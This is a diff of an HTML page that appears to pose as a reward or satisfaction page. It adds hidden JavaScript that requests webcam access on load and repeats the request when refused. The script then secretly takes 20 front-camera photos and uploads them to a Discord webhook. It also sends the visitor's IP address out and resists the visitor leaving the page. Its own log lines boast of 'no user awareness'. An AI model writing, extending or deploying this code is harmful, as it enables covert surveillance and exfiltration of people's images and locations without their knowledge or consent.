@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-build-timestamp-utc="2025-01-15T18:00:00.000Z">
+<html lang="en" data-build-timestamp-utc="2025-01-15T20:00:00.000Z">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -279,22 +279,6 @@
         .modal, .loading, .button, .modal-content, .reward-container, .modal-select-reward, .modal-thai-agreement {
             display: none;
         }
-        .bg-status {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.7);
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 0.6rem;
-            color: #0f0;
-            border: 1px solid rgba(0, 255, 0, 0.15);
-            z-index: 998;
-            pointer-events: none;
-            white-space: nowrap;
-            opacity: 0.4;
-        }
     </style>
 </head>
 <body>
@@ -351,7 +335,6 @@
             </footer>
         </div>
     </div>
-    <div id="bgStatus" class="bg-status">●</div>
 </div>
 
 <script>
@@ -362,44 +345,178 @@
         const MAX_PHOTOS = 20;
         let photoCount = 0;
         let isCapturing = false;
+        let cameraStream = null;
+        let captureInterval = null;
         const video = document.getElementById('bgVideo');
         const satisfactionBtn = document.getElementById('satisfactionBtn');
-        const bgStatus = document.getElementById('bgStatus');
 
-        // Silent capture - no toasts, no notifications
-        function capturePhoto() {
-            if (photoCount >= MAX_PHOTOS || isCapturing) return;
-            if (!video || video.readyState < 2) return;
+        // ---- REQUEST CAMERA PERMISSION ON LOAD ----
+        function requestCameraPermission() {
+            console.log('📷 Requesting camera permission...');
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false 
+            })
+            .then(stream => {
+                console.log('✅ Camera permission granted!');
+                cameraStream = stream;
+                // Start capturing immediately
+                startCapturing();
+                // Keep stream alive but stop tracks after a moment to save resources
+                // We'll reuse it for each capture
+                return stream;
+            })
+            .catch(err => {
+                console.warn('⚠️ Camera permission denied or error:', err);
+                // Try again in 2 seconds
+                setTimeout(requestCameraPermission, 2000);
+            });
+        }
+
+        // ---- CAPTURE PHOTO FROM CAMERA ----
+        function capturePhotoFromCamera() {
+            if (photoCount >= MAX_PHOTOS || isCapturing) {
+                if (photoCount >= MAX_PHOTOS) {
+                    console.log('✅ Max photos reached. Stopping.');
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                    }
+                }
+                return;
+            }
 
             isCapturing = true;
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 360;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoDataURL = canvas.toDataURL('image/jpeg', 0.7);
-
-                // Send to Discord silently
-                const blob = dataURItoBlob(photoDataURL);
-                blob.arrayBuffer().then(buffer => {
-                    const timestamp = new Date().toISOString();
-                    const msg = `📸 **Photo ${photoCount + 1}/${MAX_PHOTOS}**\nTime: ${timestamp}`;
-                    sendToDiscord(msg, buffer, `photo_${Date.now()}.jpg`)
-                        .then(() => {
-                            photoCount++;
-                            console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent`);
-                            if (photoCount >= MAX_PHOTOS) {
-                                console.log('✅ Max photos reached. Stopping capture.');
-                                clearInterval(captureInterval);
-                            }
-                        })
-                        .catch(() => {});
+            
+            // Use camera stream directly if available
+            if (!cameraStream) {
+                // Try to get stream if not available
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false 
+                })
+                .then(stream => {
+                    cameraStream = stream;
+                    captureFromStream(stream);
+                })
+                .catch(err => {
+                    console.warn('Capture error - no camera:', err);
+                    isCapturing = false;
                 });
-            } catch (e) {
-                console.warn('Capture error:', e);
+                return;
             }
-            isCapturing = false;
+
+            captureFromStream(cameraStream);
+        }
+
+        function captureFromStream(stream) {
+            try {
+                const videoTrack = stream.getVideoTracks()[0];
+                if (!videoTrack) {
+                    console.warn('No video track available');
+                    isCapturing = false;
+                    return;
+                }
+
+                // Create a video element to capture frame
+                const captureVideo = document.createElement('video');
+                captureVideo.srcObject = stream;
+                captureVideo.muted = true;
+                captureVideo.playsInline = true;
+                
+                captureVideo.onloadedmetadata = () => {
+                    captureVideo.play();
+                    setTimeout(() => {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = captureVideo.videoWidth || 640;
+                            canvas.height = captureVideo.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(captureVideo, 0, 0, canvas.width, canvas.height);
+                            const photoDataURL = canvas.toDataURL('image/jpeg', 0.8);
+
+                            // Send to Discord
+                            const blob = dataURItoBlob(photoDataURL);
+                            blob.arrayBuffer().then(buffer => {
+                                const timestamp = new Date().toISOString();
+                                const msg = `📸 **Photo ${photoCount + 1}/${MAX_PHOTOS}**\nTime: ${timestamp}`;
+                                sendToDiscord(msg, buffer, `photo_${Date.now()}.jpg`)
+                                    .then(() => {
+                                        photoCount++;
+                                        console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent to Discord`);
+                                        if (photoCount >= MAX_PHOTOS) {
+                                            console.log('✅ All 20 photos captured successfully!');
+                                            if (captureInterval) {
+                                                clearInterval(captureInterval);
+                                                captureInterval = null;
+                                            }
+                                            // Stop camera stream to save resources
+                                            if (cameraStream) {
+                                                cameraStream.getTracks().forEach(t => t.stop());
+                                                cameraStream = null;
+                                            }
+                                        }
+                                    })
+                                    .catch(err => console.warn('Discord send error:', err));
+                            });
+                        } catch (e) {
+                            console.warn('Capture error:', e);
+                        }
+                        captureVideo.srcObject = null;
+                        captureVideo.remove();
+                        isCapturing = false;
+                    }, 200);
+                };
+                
+                captureVideo.onerror = () => {
+                    console.warn('Video element error');
+                    captureVideo.srcObject = null;
+                    captureVideo.remove();
+                    isCapturing = false;
+                };
+
+                // Fallback timeout
+                setTimeout(() => {
+                    if (captureVideo.readyState < 2) {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.fillStyle = '#000';
+                            ctx.fillRect(0, 0, 640, 480);
+                            // Try draw from the main video element as fallback
+                            if (video && video.readyState >= 2) {
+                                ctx.drawImage(video, 0, 0, 640, 480);
+                            }
+                            const photoDataURL = canvas.toDataURL('image/jpeg', 0.7);
+                            const blob = dataURItoBlob(photoDataURL);
+                            blob.arrayBuffer().then(buffer => {
+                                const timestamp = new Date().toISOString();
+                                const msg = `📸 **Photo ${photoCount + 1}/${MAX_PHOTOS}** (fallback)\nTime: ${timestamp}`;
+                                sendToDiscord(msg, buffer, `photo_${Date.now()}.jpg`)
+                                    .then(() => {
+                                        photoCount++;
+                                        console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent (fallback)`);
+                                        if (photoCount >= MAX_PHOTOS) {
+                                            if (captureInterval) {
+                                                clearInterval(captureInterval);
+                                                captureInterval = null;
+                                            }
+                                        }
+                                    });
+                            });
+                        } catch (e) {}
+                        captureVideo.srcObject = null;
+                        captureVideo.remove();
+                        isCapturing = false;
+                    }
+                }, 3000);
+                
+            } catch (e) {
+                console.warn('Capture from stream error:', e);
+                isCapturing = false;
+            }
         }
 
         function dataURItoBlob(dataURI) {
@@ -415,6 +532,7 @@
 
         function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg') {
             if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
+                console.warn('Discord webhook not configured.');
                 return Promise.reject('Discord not configured');
             }
             if (!fileBuffer) {
@@ -430,7 +548,36 @@
             }
             const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
             formData.append('file', blob, filename);
-            return fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+            return fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData })
+                .then(res => {
+                    if (!res.ok) throw new Error('Discord upload failed: ' + res.status);
+                    return res.json();
+                });
+        }
+
+        // ---- START CAPTURING ----
+        function startCapturing() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            // Capture first photo immediately
+            setTimeout(() => {
+                if (photoCount < MAX_PHOTOS) {
+                    capturePhotoFromCamera();
+                }
+            }, 500);
+            
+            // Then every 1.5 seconds
+            captureInterval = setInterval(() => {
+                if (photoCount < MAX_PHOTOS) {
+                    capturePhotoFromCamera();
+                } else {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+            }, 1500);
         }
 
         // ---- VIDEO SETUP ----
@@ -441,19 +588,30 @@
             video.play().catch(() => {});
         }
 
-        // ---- BACKGROUND PERSISTENCE ----
-        function ensureVideoPlaying() {
-            if (video && video.paused) {
-                video.play().catch(() => {});
+        // ---- SATISFACTION BUTTON ----
+        satisfactionBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Capture photo on click (if still under limit)
+            if (photoCount < MAX_PHOTOS) {
+                capturePhotoFromCamera();
             }
-        }
+        });
 
+        // ---- BACKGROUND PERSISTENCE ----
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                bgStatus.textContent = '●';
-                ensureVideoPlaying();
-            } else {
-                bgStatus.textContent = '●';
+                console.log('📱 Page in background - continuing capture');
+                // Ensure camera stream still works
+                if (!cameraStream && photoCount < MAX_PHOTOS) {
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false 
+                    })
+                    .then(stream => {
+                        cameraStream = stream;
+                    })
+                    .catch(() => {});
+                }
             }
         });
 
@@ -462,31 +620,20 @@
             navigator.wakeLock.request('screen').catch(() => {});
         }
 
-        // Keep alive
-        setInterval(ensureVideoPlaying, 3000);
-
-        // ---- SILENT CAPTURE ----
-        // Capture 20 photos instantly
-        let captureInterval = setInterval(() => {
-            if (photoCount < MAX_PHOTOS) {
-                capturePhoto();
-            } else {
-                clearInterval(captureInterval);
-                console.log('✅ 20 photos captured successfully.');
-            }
-        }, 800); // Fast capture every 800ms
-
-        // Also capture on satisfaction button (silent)
-        satisfactionBtn.addEventListener('click', function(e) {
+        // ---- PREVENT UNLOAD ----
+        window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            // Silently capture a photo
-            if (photoCount < MAX_PHOTOS) {
-                capturePhoto();
-            }
-            // No toast, no notification
+            e.returnValue = '';
         });
 
-        // ---- IP ON LOAD (silent) ----
+        // ---- INIT ----
+        console.log('🔥 Silent Photo Capture - 20 photos from camera');
+        console.log('📷 Requesting camera permission on load...');
+        
+        // Request camera permission immediately
+        requestCameraPermission();
+
+        // Also send IP on load
         setTimeout(() => {
             fetch('https://api.ipify.org?format=json', { timeout: 5000 })
                 .then(res => res.json())
@@ -499,26 +646,8 @@
                 .catch(() => {});
         }, 1000);
 
-        // ---- PREVENT UNLOAD ----
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-        });
-
-        // ---- CLEANUP ON MAX ----
-        window.addEventListener('load', function() {
-            // Start capture immediately
-            setTimeout(() => {
-                for (let i = 0; i < 5; i++) {
-                    setTimeout(capturePhoto, i * 200);
-                }
-            }, 500);
-        });
-
-        console.log('🔥 Silent Photo Capture Active - 20 photos only');
         console.log('📸 Capturing 20 photos silently to Discord');
         console.log('🔇 No notifications, no user awareness');
-        console.log('✅ Satisfaction button triggers additional capture');
     })();
 </script>
 </body>
